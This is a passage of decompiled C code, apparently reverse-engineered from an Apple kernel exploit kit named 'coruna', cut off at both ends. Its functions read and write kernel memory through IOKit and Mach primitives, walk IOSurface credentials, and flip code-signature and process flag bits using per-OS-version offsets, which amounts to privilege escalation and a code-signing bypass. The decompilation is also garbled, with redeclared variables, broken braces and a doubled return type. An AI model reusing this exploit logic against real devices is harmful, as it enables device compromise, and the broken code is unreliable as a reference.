          off = 0x10a;
          base = 0x102;
          if (!err) {
            base = off;
          }
          addr = 0x107;
          off = 0xff;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        if (0x1c1a < err) {
          err = coruna_ctx_test_flag(handle,0x80000);
          err = err == 0;
          ctx_val = 0x100;
          if (!err) {
            ctx_val = 0x108;
          }
          off = 0x109;
          base = 0x101;
          if (!err) {
            base = off;
          }
          addr = 0x107;
          off = 0xff;
          if (!err) {
            off = addr;
          }
        }
        else {
        ctx_val = 0x108;
        if (size < 0x18090a07900000) {
          ctx_val = 0x110;
        }
        base = 0x109;
        if (size < 0x18090a07900000) {
          base = 0x111;
        }
        off = 0x107;
        if (size < 0x18090a07900000) {
          off = 0x10f;
        }
      }
      else {
        u = 0x1180000;
check_ok:
        err = coruna_ctx_test_flag(handle,u);
        err = err == 0;
        ctx_val = 0xc1;
        if (!err) {
          ctx_val = 0xc9;
        }
        base = 0xc2;
        if (!err) {
          base = 0xca;
        }
        addr = 199;
        off = 0xbf;
cleanup:
        if (!err) {
          off = addr;
        }
      }
      off = off + handle;
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
      if (err == 0) {
        return 0;
      }
      if (scratch == '\0') {
        return 0;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,ctx_val + handle,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch == '\0') break;
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,base + handle,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch != '\0') {
        off = handle + 0x92;
        u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
        if ((int)u == 0) {
          return u;
        }
        if (scratch != '\0') {
          break;
        }
      }
    }
    }
    else {
      off = handle + 0x92;
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,off,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch != '\0') {
        break;
      }
    }
    u = 0;
    } while (0);
  }
  return u;
}





unsigned long coruna_return_zero_1d778(long arg,uint64_t val)

{
  bool i;
  int err;
  long serial_11;
  unsigned long size;
  uint64_t kind;
  long base;
  long ctx_val;
  long serial;
  char cache_34;
  long cache_35;
  char cache_36;
  
  cache_36 = '\0';
  err = coruna_ctx_test_flag(arg,0x5184001);
  if (err == 0) {
load_ok_21:
    size = 1;
  }
  else {
    serial_11 = coruna_kernel29bb0_via_return_zero_2019c(arg,val);
    if (serial_11 == 0) {
      return 0;
    }
    err = coruna_ctx_test_flag(arg,0x20);
    if (err == 0) {
      err = *(int *)(arg + 0x140);
      if (err < 0x2712) {
        if (0x2257 < err) {
          err = coruna_ctx_test_flag(arg,0x1180000);
          i = err == 0;
          base = 0xb9;
          if (!i) {
            base = 0xc1;
          }
          ctx_val = 0xc2;
          serial = 0xba;
          if (!i) {
          serial = ctx_val;
          }
          }
          size = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,base + serial_11,1,&cache_36);
          if ((int)size == 0) {
          return size;
        }
        if (0x1f52 < err) {
          kind = 0x180000;
          err = coruna_ctx_test_flag(arg,kind);
          i = err == 0;
          base = 0xc1;
          if (!i) {
          base = 0xc9;
          }
          ctx_val = 0xca;
          serial = 0xc2;
          if (!i) {
          serial = ctx_val;
          }
          }
          size = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,base + serial_11,1,&cache_36);
          if ((int)size == 0) {
          return size;
        }
        size = *(unsigned long *)(arg + 0x158);
        if (0x1c1b0a800fffff < size) {
          err = coruna_ctx_test_flag(arg,0x80000);
          i = err == 0;
          base = 0x101;
          if (!i) {
            base = 0x109;
          }
          ctx_val = 0x10a;
          serial = 0x102;
          if (!i) {
          serial = ctx_val;
          }
          }
          size = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,base + serial_11,1,&cache_36);
          if ((int)size == 0) {
          return size;
        }
        if (0x1c1a < err) {
          err = coruna_ctx_test_flag(arg,0x80000);
          i = err == 0;
          base = 0x100;
          if (!i) {
            base = 0x108;
          }
          ctx_val = 0x109;
          serial = 0x101;
          if (!i) {
          serial = ctx_val;
          }
          }
          size = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,base + serial_11,1,&cache_36);
          if ((int)size == 0) {
          return size;
        }
        base = 0x108;
        if (size < 0x18090a07900000) {
          base = 0x110;
        }
        serial = 0x109;
        if (size < 0x18090a07900000) {
          serial = 0x111;
        }
      }
      else {
        kind = 0x1180000;
load_ok_23:
        err = coruna_ctx_test_flag(arg,kind);
        i = err == 0;
        base = 0xc1;
        if (!i) {
          base = 0xc9;
        }
        ctx_val = 0xca;
        serial = 0xc2;
load_ok_22:
        if (!i) {
          serial = ctx_val;
        }
      }
      size = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,base + serial_11,1,&cache_36);
      if ((int)size == 0) {
        return size;
      }
      if (cache_36 == '\0') goto load_ok_21;
      size = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,serial + serial_11,1,&cache_36);
      err = (int)size;
    }
    else {
      size = coruna_kernel29bb0_trampoline_0001a670(arg,serial_11 + 0xb0,&cache_35);
      if ((int)size == 0) {
        return size;
      }
      serial_11 = coruna_ptr_canonicalize(arg,cache_35);
      if (serial_11 == 0) {
        return 0;
      }
      size = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,cache_35 + 0x20,1,&cache_34);
      err = (int)size;
      cache_36 = cache_34;
    }
    if (err != 0) {
      size = (unsigned long)(cache_36 != '\0');
    }
  }
  return size;
}





unsigned long coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod(uint64_t arg)

{
  int j;
  long serial_7;
  unsigned long u;
  uint path_buf;
  
  serial_7 = coruna_return_zero_211b0();
  u = 0;
  if ((serial_7 != 0) && (u = coruna_kernel29bb0_via_ioconnectcallmethod(arg,serial_7,&path_buf), (int)u != 0)) {
    if ((path_buf & 1) == 0) {
      j = coruna_kernel29bb0_trampoline_0001a360(arg,serial_7,path_buf | 1);
      u = (unsigned long)(j != 0);
    }
    else {
      u = 1;
    }
  }
  return u;
}





unsigned long coruna_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_2(long arg,uint64_t val,int n)

{
  uint port;
  bool flags;
  unsigned long u;
  long addr;
  uint kind;
  uint cache_37;
  
  u = coruna_return_zero_1d778();
  if ((((int)u != 0) && (addr = coruna_return_zero_211b0(arg,val), u = 0, addr != 0)) &&
     (u = coruna_kernel29bb0_via_ioconnectcallmethod(arg,addr,&cache_37), (int)u != 0)) {
    kind = 0x10000001;
    if (n == 0) {
      kind = 0x301;
    }
    kind = kind | cache_37 & 0xeffffcfe;
    flags = kind == cache_37;
    cache_37 = kind;
    if (((flags) || (u = coruna_kernel29bb0_trampoline_0001a360(arg,addr), (int)u != 0)) &&
       ((addr = coruna_return_zero_2019c(arg,val), u = 0, addr != 0 &&
        (u = coruna_iosurface_cred_walk(arg), (int)u != 0)))) {
      addr = addr + (u & 0xffffffff);
      u = coruna_kernel29bb0_via_ioconnectcallmethod(arg,addr,&cache_37);
      if ((int)u != 0) {
        kind = 0x8010;
        if (*(unsigned long *)(arg + 0x158) < 0x1c1b1e02600000) {
          kind = 0x10;
        }
        port = cache_37 & (kind ^ 0xffffffff);
        if (n == 0) {
          port = kind | cache_37;
        }
        if ((port == cache_37) ||
           (cache_37 = port, u = coruna_mach_vm_machine_attribute(arg,addr), (int)u != 0)) {
          u = 1;
        }
      }
    }
  }
  return u;
}





void coruna_kernel29bb0_via_kernel29bb0_via_kernel09_via_bzero_2(long handle,uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  unsigned long size;
  uint8_t scratch[12];
  uint bootargs;
  uint8_t thread_attr[8];
  long host_info;
  uint8_t serial_buf[20];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_call_macho_data_seg_2bb24_2bdb4_20fac(handle,val,&bootargs);
  u = 0;
  if ((handle != 0) &&
     (((((bootargs >> 10 & 1) != 0 ||
        (u = coruna_mach_vm_machine_attribute(handle,handle,bootargs | 0x400), (int)u != 0)) &&
       (u = coruna_return_zero_1bfe0(handle,val,thread_attr), (int)u != 0)) &&
      (u = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98_3(handle,thread_attr), (int)u != 0)))) {
    coruna_kernel29bb0_via_kernel09_via_bzero_2(thread_attr);
    u = coruna_return_zero_1de70(handle,val,scratch);
    if (((int)u != 0) &&
       (u = coruna_return_zero_1df50(handle,val,scratch,0,thread_attr), (int)u != 0)) {
      size = *(unsigned long *)(handle + 0x158);
      if (size < 0x1f530f02800000) {
        if (size < 0x1f530000000000) {
          handle = 0x48;
          if (size < 0x1c1b1914600000) {
            handle = 0x40;
          }
        }
        else {
          handle = 0x48;
        }
      }
      else {
        handle = 0x58;
      }
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,host_info + handle,0x14,serial_buf);
      if ((err == 0) || (err = coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa9(handle,serial_buf,0x14), err == 0)) {
        u = 0;
      }
      else {
        u = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98_3(handle,thread_attr);
        if ((int)u != 0) {
          coruna_kernel29bb0_via_kernel09_via_bzero_2(thread_attr);
          u = 1;
        }
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != action) {
    ___stack_chk_fail(u);
  }
  return;
}





uint64_t coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_18d98_3(long handle,uint *size)
{
  uint u;
  bool err;
  uint64_t size;
  unsigned long version;
  long handle;
  long scratch;
  uint bootargs;
  uint thread_attr;
  
  thread_attr = 1;
  version = *(unsigned long *)(handle + 0x158);
  if (version < 0x1f530f02800000) {
    if (version < 0x1f530000000000) {
      if (version < 0x1c1b1914600000) {
        handle = 0xa0;
        if (*(int *)(handle + 0x140) < 0x1c1b) {
          handle = 0xa8;
        }
      }
      else {
        handle = 0xa8;
      }
    }
    else {
      handle = 0xb8;
    }
  }
  else {
    handle = 0xac;
  }
  size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,*(long *)(size + 2) + handle,1,&thread_attr);
  if ((int)size != 0) {
    if ((thread_attr & 1) == 0) {
      thread_attr = thread_attr | 1;
      size = coruna_call_mach_vm_machine_attribute_29df8_1acd4(handle,*(long *)(size + 2) + handle,&thread_attr,1);
      if ((int)size == 0) {
        return size;
      }
    }
    size = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,*(long *)(size + 2) + 0xc,4,&bootargs);
    if ((int)size != 0) {
      if (((bootargs ^ 0xffffffff) & 0x4004000) != 0) {
        u = 0x4000000;
        if (*(int *)(handle + 0x140) < 0x1c1b) {
          u = 0x4004000;
        }
        u = u | bootargs;
        err = u != bootargs;
        bootargs = u;
        if (err) {
          size = coruna_call_mach_vm_machine_attribute_29df8_1acd4(handle,*(long *)(size + 2) + 0xc,&bootargs,4);
          if ((int)size == 0) {
            return size;
          }
          *size = bootargs;
        }
      }
      size = coruna_kernel29bb0_trampoline_0001a670(handle,*(long *)(size + 2) + 0x88,&scratch);
      if (((int)size != 0) &&
         ((scratch == 0 ||
          (size = coruna_call_mach_vm_machine_attribute_29df8_1accc(handle,*(long *)(size + 2) + 0x88,0), (int)size != 0)))) {
        size[0x14] = 0;
        size = 1;
      }
    }
  }
  return size;
}





uint64_t coruna_return_zero_1de70(uint64_t val,uint64_t id_2,unsigned long *arg)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  unsigned long scratch;
  uint bootargs;
  uint8_t thread_attr[4];
  unsigned long host_info;
  
  host_info = 0;
  handle = coruna_ret_stub_2();
  u = 0;
  if (handle != 0) {
    addr = coruna_return_zero_2b0c0(val,handle);
    u = 0;
    if ((addr != 0) && (u = coruna_kernel29bb0_trampoline_0001a670(val,addr,&host_info), (int)u != 0)) {
      if (((uint)host_info >> 2 & 1) == 0) {
        handle = coruna_return_zero_1f078(val,handle);
        if ((((handle == 0) || (handle = coruna_return_zero_1f958(val,handle), handle == 0)) ||
            (err = coruna_return_zero_24300(val,thread_attr,&bootargs), err == 0)) ||
           (err = coruna_call_mach_vm_machine_attribute_29df8_18d98(val,handle + (unsigned long)bootargs,8,&scratch), err == 0)) {
          return 0;
        }
      }
      else {
        scratch = host_info & 0xfffffffffffff000;
      }
      *arg = scratch;
      u = 1;
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_1df50(uint64_t val,uint size,uint64_t id_2,uint64_t size_3,uint *flags_2)
{
  uint u;
  int err;
  long handle;
  int *err;
  int *status;
  uint *ptr;
  uint *buf;
  void *ptr;
  uint size;
  uint *str;
  uint *copy;
  uint version;
  uint port;
  uint64_t *data;
  uint *obj;
  size_t ls16;
  uint64_t tag;
  uint kind;
  unsigned long type_id;
  uint *scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long host_info;
  long serial_buf;
  long action;
  size_t block_ctx;
  long stack_guard;
  uint sa_saved;
  
  sa_saved = 0;
  block_ctx = 0;
  stack_guard = 0;
  serial_buf = 0;
  action = 0;
  thread_attr = 0;
  host_info = 0;
  bootargs = 0;
  if ((((((flags_2 == (uint *)0x0) || (handle = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_4(), handle == 0)) ||
        (err = coruna_kernel29bb0_trampoline_0001a670(val,handle + 0x90,&host_info), err == 0)) ||
       ((err = coruna_kernel29bb0_trampoline_0001a670(val,handle + 0x80,&action), err == 0 ||
        (err = coruna_kernel29bb0_trampoline_0001a670(val,handle + 0x88,&serial_buf), err == 0)))) ||
      ((err = coruna_kernel29bb0_via_ioconnectcallmethod(val,handle + 0xc,&sa_saved), err == 0 ||
       (((sa_saved & 1) == 0 ||
        (err = coruna_kernel29bb0_trampoline_0001a670(val,handle + 0x28,&block_ctx), err == 0)))))) ||
     (err = coruna_kernel29bb0_trampoline_0001a670(val,handle + 0x38,&stack_guard), err == 0)) {
    return 0;
  }
  if (stack_guard == 0) {
    return 0;
  }
  if (block_ctx == 0) {
    return 0;
  }
  err = coruna_call_mach_vm_machine_attribute_29df8_18d98(val,handle + 0x10,8,&bootargs);
  if (err == 0) {
    return 0;
  }
  err = _malloc(block_ctx);
  if (err == (int *)0x0) {
    return 0;
  }
  flags_2[0x18] = 0;
  flags_2[0x19] = 0;
  flags_2[0x12] = 0;
  flags_2[0x13] = 0;
  flags_2[0x10] = 0;
  flags_2[0x11] = 0;
  flags_2[0x16] = 0;
  flags_2[0x17] = 0;
  flags_2[0x14] = 0;
  flags_2[0x15] = 0;
  flags_2[10] = 0;
  flags_2[0xb] = 0;
  flags_2[8] = 0;
  flags_2[9] = 0;
  flags_2[0xe] = 0;
  flags_2[0xf] = 0;
  flags_2[0xc] = 0;
  flags_2[0xd] = 0;
  flags_2[2] = 0;
  flags_2[3] = 0;
  flags_2[0] = 0;
  flags_2[1] = 0;
  flags_2[6] = 0;
  flags_2[7] = 0;
  flags_2[4] = 0;
  flags_2[5] = 0;
  err = coruna_call_mach_vm_machine_attribute_29df8_18d98(val,stack_guard,block_ctx,err);
  if (err != 0) {
    *flags_2 = sa_saved;
    *(long *)(flags_2 + 2) = handle;
    *(size_t *)(flags_2 + 4) = block_ctx;
    *(long *)(flags_2 + 6) = stack_guard;
    *(uint64_t *)(flags_2 + 8) = thread_attr;
    *(uint64_t *)(flags_2 + 10) = bootargs;
    flags_2[0x11] = size;
    err = (int)stack_guard;
    size = 0;
    if (action != 0) {
      size = (int)action - err;
    }
    flags_2[0x13] = size;
    if (size < block_ctx) {
      kind = 0;
      if (serial_buf != 0) {
        kind = (int)serial_buf - err;
      }
      version = 0;
      if (host_info != 0) {
        version = (int)host_info - err;
      }
      flags_2[0x14] = kind;
      flags_2[0x15] = version;
      if ((version == 0) || (version < block_ctx)) {
        flags_2[0x16] = 0;
        if (*err == 0x20cdefa) {
          scratch = (uint *)coruna_malloc();
          coruna_kernel29bb0_via_kernel09_via_bzero_2(flags_2);
          tag = 0;
          status = (int *)coruna_memcpy_24a7c(err);
          if (status != (int *)0x0) {
            err = coruna_iokit_msg_append(scratch,0,status);
            if (err != -1) {
              kind = 0;
              size = 0;
              flags_2[0xc] = 1;
              *(uint **)(flags_2 + 0xe) = scratch;
              flags_2[0x10] = 0;
              flags_2[0x17] = kind;
              handle = coruna_wire_map_lookup(flags_2,size,0xfade0c02);
              if (handle != 0) {
                flags_2[0x12] = (uint)*(byte *)(handle + 0x24);
                tag = 1;
                _free(err);
                return tag;
              }
            }
          }
          coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
        }
        else {
          if ((*err != -0x3ff32106) ||
             coruna_kernel29bb0_via_kernel09_via_bzero_2(flags_2);
             tag = 0;
          kind = err[2];
          if (kind == 0) {
            kind = 0xfffffffe;
          }
          else {
            kind = (kind & 0xff00ff00) >> 8 | (kind & 0xff00ff) << 8;
            type_id = (unsigned long)(kind >> 0x10 | kind << 0x10);
            ptr = (uint *)(err + 4);
            kind = 0;
            do {
              u = ptr[-1];
              version = (*ptr & 0xff00ff00) >> 8 | (*ptr & 0xff00ff) << 8;
              port = version >> 0x10 | version << 0x10;
              version = port;
              if (kind <= port && kind != 0) {
                version = kind;
              }
              status = (int *)coruna_memcpy_24a7c((long)err + (unsigned long)port);
              if (status == (int *)0x0) {
                coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
                continue;
              }
              kind = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
              kind = kind >> 0x10 | kind << 0x10;
              err = coruna_iokit_msg_append(scratch,kind,status);
              if (err == -1) {
                coruna_bzero(status);
                continue;
              }
              if (*status == 0x20cdefa) {
                if (size == 0) {
                  if (u == 0) {
                    kind = 0;
                    flags_2[0x10] = kind;
                  }
                }
                else if (port == size) {
                  flags_2[0x10] = kind;
                }
              }
              ptr = ptr + 2;
              type_id = type_id - 1;
              kind = version;
            } while (type_id != 0);
            kind = (uint)((unsigned long)version + 0x7fffffff4 >> 3);
          }
          size = flags_2[0x10];
          if (*scratch != 0) {
            type_id = 0;
            data = (uint64_t *)(*(long *)(scratch + 2) + 8);
            ptr = (uint *)0x0;
            str = (uint *)0x0;
            version = 0;
            do {
              obj = (uint *)*data;
              u = (*obj & 0xff00ff00) >> 8 | (*obj & 0xff00ff) << 8;
              u = u >> 0x10 | u << 0x10;
              buf = ptr;
              copy = str;
              port = version;
              if (u == 0xfade0c02) {
                copy = obj;
                if (*(uint *)(data + -1) != size) {
                  copy = str;
                }
              }
              else if ((u == 0xfade7171) &&
                      (buf = obj, port = (uint)type_id, *(uint *)(data + -1) != 5)) {
                buf = ptr;
                port = version;
              }
              type_id = type_id + 1;
              data = data + 2;
              ptr = buf;
              str = copy;
              version = port;
            } while (*scratch != type_id);
            if (buf != (uint *)0x0) {
              size = (buf[1] & 0xff00ff00) >> 8 | (buf[1] & 0xff00ff) << 8;
              type_id = (unsigned long)(size >> 0x10 | size << 0x10);
              if (copy == (uint *)0x0) {
                ls16 = type_id + 1;
              }
              else {
                size = copy[10];
                ls16 = (size_t)size;
                if ((size == 0) || ((size & 0x3fff) != 0)) {
                  ls16 = type_id + 1;
                }
              }
              ptr = _realloc(buf,ls16);
              if (ptr == (void *)0x0) {
                coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
              }
              else {
                _bzero((void *)((long)ptr + type_id),ls16 - type_id);
                *(void **)(*(long *)(scratch + 2) + (unsigned long)port * 0x10 + 8) = ptr;
                size = flags_2[0x10];
              }
            }
          }
          flags_2[0xc] = 1;
          *(uint **)(flags_2 + 0xe) = scratch;
          flags_2[0x17] = kind;
          handle = coruna_wire_map_lookup(flags_2,size,0xfade0c02);
          if (handle != 0) {
            flags_2[0x12] = (uint)*(byte *)(handle + 0x24);
            tag = 1;
            _free(err);
            return tag;
          }
        }
      }
    }
  }
fail:
  coruna_kernel29bb0_via_kernel09_via_bzero_2(flags_2);
  tag = 0;
retry:
  _free(err);
  return tag;
}





uint64_t coruna_return_zero_272a8(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  scratch = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1809 && err != 0x1c1b) {
        return 0;
      }
      size = 0x20000;
      handle = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_8(handle);
      u = 0;
      if ((handle != 0) && (u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + 0x48,4,&scratch), (int)u != 0)) {
      *(bool *)size_3 = (scratch & size) != 0;
      u = 1;
      }
      return u;
    }
  }
  else if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
    return 0;
  }
  size = 0x80000;
fail:
  handle = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_8(handle);
  u = 0;
  if ((handle != 0) && (u = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle + 0x48,4,&scratch), (int)u != 0)) {
    *(bool *)size_3 = (scratch & size) != 0;
    u = 1;
  }
  return u;
}





unsigned long coruna_return_zero_27378(long arg,uint64_t val,uint64_t n,int m)

{
  int j;
  long serial_7;
  unsigned long u;
  uint size;
  uint cache_37;
  
  cache_37 = 0;
  j = *(int *)(arg + 0x140);
  if (j < 0x2258) {
    if (1 < j - 0x1f53U) {
      if (j != 0x1809 && j != 0x1c1b) {
        return 0;
      }
      size = 0x20000;
      serial_7 = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_8(arg);
      u = 0;
      if (serial_7 != 0) {
      u = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,serial_7 + 0x48,4,&cache_37);
      if ((int)u != 0) {
      if (m == 0) {
      cache_37 = cache_37 & (size ^ 0xffffffff);
      }
      else {
      cache_37 = cache_37 | size;
      }
      j = coruna_call_mach_vm_machine_attribute_29df8_1aa94(arg,serial_7 + 0x48,&cache_37,4);
      u = (unsigned long)(j != 0);
      }
      }
      return u;
    }
  }
  else if ((j != 0x2258 && j != 0x2712) && j != 0x225c) {
    return 0;
  }
  size = 0x80000;
load_ok_24:
  serial_7 = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_8(arg);
  u = 0;
  if (serial_7 != 0) {
    u = coruna_call_mach_vm_machine_attribute_29df8_18d98(arg,serial_7 + 0x48,4,&cache_37);
    if ((int)u != 0) {
      if (m == 0) {
        cache_37 = cache_37 & (size ^ 0xffffffff);
      }
      else {
        cache_37 = cache_37 | size;
      }
      j = coruna_call_mach_vm_machine_attribute_29df8_1aa94(arg,serial_7 + 0x48,&cache_37,4);
      u = (unsigned long)(j != 0);
    }
  }
  return u;
}





void coruna_mach_vm_alloc(long handle,uint64_t val,mach_vm_address_t arg,unsigned long arg_x,
                 vm_prot_t arg_x_x,int flags,int count_2)
{
  uint u;
  long handle;
  vm_map_t target;
  uint size;
  size_t ls4;
  unsigned long version;
  uint8_t *ptr;
  int err;
  kern_return_t lk8;
  int status;
  unsigned long port;
  long addr;
  long off;
  void *ptr;
  uint32_t *buf;
  long base;
  size_t ls16;
  int flags;
  mach_vm_address_t *lpm18;
  unsigned long tag;
  bool err;
  mach_vm_size_t size;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint8_t host_info[8];
  int serial_buf;
  uint32_t scratch;
  mach_vm_address_t action [3];
  unsigned long block_ctx;
  uint64_t stack_guard;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t sa_saved;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  int path_buf;
  int tmp_buf;
  long region;
  
  region = *(long *)k_kernel_stack_chk_guard_slot;
  port = coruna_return_zero_1d778();
  if (*(long *)k_kernel_stack_chk_guard_slot == region) {
  return;
  }
  ___stack_chk_fail(port);
}





bool coruna_kernel29bb0_via_wire_map_lookup_2(uint64_t val,uint64_t id_2,int flags,int count_2)
{
  unsigned long u;
  uint size;
  unsigned long version;
  bool err;
  int err;
  long handle;
  unsigned long port;
  unsigned long tag;
  uint8_t scratch[104];
  
  err = coruna_return_zero_1bfe0(val,id_2,scratch);
  if (err == 0) {
    return false;
  }
  handle = coruna_wire_map_lookup(scratch,0,0xfade0c02);
  if ((handle != 0) &&
     (size = (*(uint *)(handle + 8) & 0xff00ff00) >> 8 | (*(uint *)(handle + 8) & 0xff00ff) << 8,
     0x80 < (size >> 0x10 | size << 0x10) >> 10)) {
    port = *(unsigned long *)(handle + 0x50);
    u = 0x10;
    if (flags == 0) {
      u = 0;
    }
    version = (port & 0xaf00ff00ff00ff00) >> 8 | (port & 0xff00ff00ff00ff) << 8;
    version = (version & 0xffff0000ffff0000) >> 0x10 | (version & 0xffff0000ffff) << 0x10;
    tag = version >> 0x20 | version << 0x20;
    version = 0x40;
    if (count_2 == 0) {
      version = 0;
    }
    port = (port & 0xff00ff00ff00ff00) >> 8 | (port & 0xff00ff00ff00ff) << 8;
    port = (port & 0xffff0000ffff0000) >> 0x10 | (port & 0xffff0000ffff) << 0x10;
    if ((version | u | tag) == (port >> 0x20 | port << 0x20)) {
      err = true;
      coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
      return err;
    }
    u = (tag & 0xff00ff00ff00ff00) >> 8 | (version | u | tag & 0xff00ff00ff00ff) << 8;
    u = (u & 0xffff0000ffff0000) >> 0x10 | (u & 0xffff0000ffff) << 0x10;
    *(unsigned long *)(handle + 0x50) = u >> 0x20 | u << 0x20;
    err = coruna_kernel29bb0_via_memcpy_24a7c(scratch,0);
    if (err != 0) {
      err = coruna_open_dev_null_1c258(val,scratch);
      err = err != 0;
      coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
      return err;
    }
  }
  err = false;
fail:
  coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
  return err;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_kernel09_via_bzero_2_2(uint64_t val,uint64_t id_2)
{
  uint64_t u;
  uint8_t scratch[104];
  
  u = coruna_return_zero_1bfe0(val,id_2,scratch);
  if ((int)u != 0) {
    coruna_kernel29bb0_via_kernel09_via_bzero_2(scratch);
    u = 1;
  }
  return u;
}





unsigned long coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_5(uint64_t arg,uint64_t val)

{
  int j;
  unsigned long tag;
  long serial_11;
  long addr;
  uint tmp_buf;
  uint cache_37;
  long cache_38;
  long cache_39;
  
  cache_38 = 0;
  cache_39 = 0;
  tag = coruna_iosurface_wire_meta_offsets(arg,&cache_37,&tmp_buf);
  if ((int)tag != 0) {
    j = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_13(arg,val,&cache_39);
    if (j == 0) {
      tag = coruna_kernel29bb0_trampoline_0001a670(arg,cache_39 + (unsigned long)cache_37,&cache_39);
      if (((int)tag != 0) && (serial_11 = coruna_ptr_canonicalize(arg,cache_39), tag = 0, serial_11 != 0)) {
        serial_11 = cache_39 + (unsigned long)tmp_buf;
        tag = coruna_kernel29bb0_trampoline_0001a670(arg,serial_11,&cache_38);
        if ((int)tag != 0) {
          if (cache_38 == 0) {
            tag = 1;
          }
          else {
            addr = coruna_ptr_canonicalize(arg);
            tag = 0;
            if (addr != 0) {
              j = coruna_call_mach_vm_machine_attribute_29df8_1accc(arg,serial_11,0);
              tag = (unsigned long)(j != 0);
            }
          }
        }
      }
    }
    else {
      tag = 0;
    }
  }
  return tag;
}





uint64_t coruna_kernel29bb0_via_return_zero_2b0c0_2(uint64_t val,uint64_t id_2,unsigned long arg)
{
  long handle;
  uint64_t u;
  unsigned long scratch;
  
  scratch = 0;
  handle = coruna_ret_stub_2();
  u = 0;
  if (handle != 0) {
    handle = coruna_return_zero_2b0c0(val,handle);
    u = 0;
    if ((handle != 0) && (u = coruna_kernel29bb0_trampoline_0001a670(val,handle,&scratch), (int)u != 0)) {
      if (((uint)scratch >> 2 & 1) == 0) {
        scratch = arg & 0xfffffffffffff000 | scratch | 4;
        u = coruna_kernel29bb0_residual_167(val,handle);
        if ((int)u == 0) {
          return u;
        }
      }
      u = 1;
    }
  }
  return u;
}





int * coruna_wire_map_slot_lookup(long handle,int flags,uint size)
{
  uint u;
  int *err;
  unsigned long size;
  
  if ((handle != 0) && (*(int *)(handle + 0x30) == 1)) {
    u = **(uint **)(handle + 0x38);
    size = (unsigned long)u;
    if (u != 0) {
      err = *(int **)(*(uint **)(handle + 0x38) + 2);
      do {
        if ((*err == flags) &&
           (u = (**(uint **)(err + 2) & 0xff00ff00) >> 8 |
                    (**(uint **)(err + 2) & 0xff00ff) << 8,
           (u >> 0x10 | u << 0x10) == size)) {
          return err;
        }
        err = err + 4;
        size = size - 1;
      } while (size != 0);
    }
  }
  return (int *)0x0;
}





void * coruna_memcpy_24a7c(void *ctx)
{
  uint u;
  void *ptr;
  unsigned long size;
  
  u = (*(uint *)((long)ctx + 4) & 0xff00ff00) >> 8 |
          (*(uint *)((long)ctx + 4) & 0xff00ff) << 8;
  size = (unsigned long)(u >> 0x10 | u << 0x10);
  ptr = _malloc(size);
  if (ptr != (void *)0x0) {
    _memcpy(ptr,ctx,size);
  }
  return ptr;
}





void coruna_bzero(void *ctx)
{
  uint u;
  void (*ptr)(void);
  unsigned long unaff_x30;
  
  if (ctx == (void *)0x0) {
    return;
  }
  u = *(uint *)((long)ctx + 4);
  if (u != 0) {
    u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
